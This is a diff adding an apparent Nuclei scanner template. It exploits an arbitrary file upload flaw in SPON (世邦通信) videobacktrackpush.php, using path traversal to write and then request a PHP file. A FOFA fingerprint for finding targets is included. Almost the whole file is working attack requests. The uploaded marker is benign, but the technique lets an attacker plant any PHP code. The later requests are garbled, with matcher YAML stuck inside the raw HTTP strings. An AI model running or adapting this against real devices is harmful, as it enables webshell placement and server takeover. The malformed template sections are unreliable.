@@ -1,0 +1,130 @@
+id: poc-zaz5bfvlecglqe91
+info:
+  name: 世邦通信股份有限公司 videobacktrackpush.php函数任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zaz5bfvlecglqe91'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zaz5bfvlecglqe91
+    fofa: icon_hash=-1830859634
+http:
+- raw:
+  - 'POST /php/videobacktrackpush.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Content-Length: 142
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Upgrade-Insecure-Requests: 1
+
+    jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=1_2_3.php&jsondata[videocontent]=PD9waHAgZWNobyAxMjM7'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /1_2_3.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Connection: keep-alive
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /php/videobacktrackpush.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 133
+
+
+    jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=1_2_3.php&jsondata[videocontent]=PD9waHAgZWNobyAxMjM7
+
+    - |'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /1_2_3.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+
+    matchers:
+
+    - type: dsl
+
+    name: fileupload
+
+    dsl:
+
+    - "status_code_2 == 200 && contains(body_2,''123'')"'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
